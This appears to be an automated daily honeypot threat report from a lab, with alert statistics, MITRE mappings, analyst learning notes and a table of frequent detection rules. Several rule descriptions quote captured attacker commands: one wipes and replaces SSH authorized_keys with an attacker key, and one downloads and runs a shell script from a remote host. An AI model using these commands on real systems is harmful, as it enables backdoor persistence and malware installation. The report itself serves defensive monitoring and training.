# LearningLab01 Daily Threat Intelligence Report — 2026-09-27

Generated: 2026-09-27T13:15:05.048Z

Report window: 2026-09-26T13:15:05.024Z through 2026-09-27T13:15:05.024Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 200,988 |
| Attack-related alerts | 15,153 |
| Honeypot interactions | 188,919 |
| Authentication failures | 4,333 |
| Authentication successes | 500 |
| Critical alerts | 184 |
| High alerts | 495 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 184 critical-severity alerts require priority review.
- 495 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 8.67:1.
- Country attribution currently covers only 3.21% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (88,588 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 184 | 0.09% |
| High | 495 | 0.25% |
| Medium | 2,070 | 1.03% |
| Low | 198,239 | 98.63% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 4,333
- Authentication successes: 500
- Failure-to-success ratio: 8.67:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 8,365 | 55.20% |
| Payload delivery | 8,365 | 55.20% |
| Authentication failure | 4,333 | 28.59% |
| Command execution | 1,618 | 10.68% |
| Reconnaissance | 303 | 2.00% |
| Malware | 177 | 1.17% |
| SMTP attack | 132 | 0.87% |
| Web attack | 64 | 0.42% |
| Network scan | 43 | 0.28% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 6,450 alerts, representing 3.21% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 194,538 | 96.79% | Not geolocated |
| Republic of Moldova | 2,985 | 1.49% | ████████████████████ |
| New Zealand | 2,702 | 1.34% | ██████████████████ |
| Germany | 510 | 0.25% | ███ |
| United Kingdom | 192 | 0.10% | █ |
| United States | 45 | 0.02% | █ |
| Australia | 5 | 0.00% | █ |
| Switzerland | 5 | 0.00% | █ |
| Canada | 3 | 0.00% | █ |
| Netherlands | 2 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 304 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 73 |
| Execution | 39 |
| Command and Control | 31 |
| Impact | 13 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 73 |
| Command and Scripting Interpreter | 39 |
| Ingress Tool Transfer | 31 |
| Exploit Public-Facing Application | 13 |
| Stored Data Manipulation | 13 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 88,588 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (88,588) |
| 110207 | 5 | 59,315 | T-Pot SentryPeer SIP activity from [IP address]:60980, method INVITE | tpot (59,315) |
| 110213 | 4 | 12,288 | T-Pot RDP connection from [IP address] to port 3389. | tpot (12,288) |
| 110204 | 4 | 11,154 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (11,154) |
| 110205 | 6 | 8,317 | T-Pot Honeytrap received a payload from [IP address] | tpot (8,317) |
| 110219 | 4 | 6,288 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (6,288) |
| 110101 | 3 | 4,948 | Cowrie SSH connection from [IP address]. | tpot (4,948) |
| 110102 | 5 | 4,333 | Cowrie failed login from [IP address] using username root. | tpot (4,333) |
| 110201 | 4 | 2,124 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (2,124) |
| 110104 | 7 | 1,403 | Cowrie captured a command from [IP address]: ls /home; /bin/busybox BOTNET | tpot (1,403) |
| 110216 | 4 | 290 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (290) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110103 | 10 | 209 | Cowrie accepted login from [IP address] using username system. | tpot (209) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110109 | 13 | 171 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (171) |
| 5502 | 3 | 165 | PAM: Login session closed. | tpot (163), wazuh (2) |
| 110217 | 7 | 132 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (132) |
| 110105 | 12 | 120 | Cowrie captured a file download from [IP address]. | tpot (120) |
| 110221 | 7 | 105 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (105) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110106 | 10 | 73 | Cowrie detected repeated failed logins from [IP address]. | tpot (73) |
| 110215 | 4 | 72 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (72) |
| 110223 | 5 | 60 | T-Pot HoneyAML received  request from  to  on port . | tpot (60) |
| 110220 | 8 | 55 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (55) |
| 110212 | 10 | 48 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (48) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110214 | 9 | 33 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (33) |
| 110108 | 12 | 26 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (26) |
| 110208 | 7 | 20 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:11482 | tpot (20) |
| 110107 | 12 | 18 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (18) |
| 110225 | 13 | 13 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (13) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110211 | 9 | 10 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (10) |
| 110224 | 7 | 4 | T-Pot HoneyAML received an HTTP POST from [IP address] to /. | tpot (4) |
| 2904 | 7 | 3 | Dpkg (Debian Package) half configured. | tpot (3) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 2902 | 7 | 2 | New dpkg (Debian Package) installed. | tpot (2) |
| 550 | 7 | 2 | Integrity checksum changed. | tpot (2) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
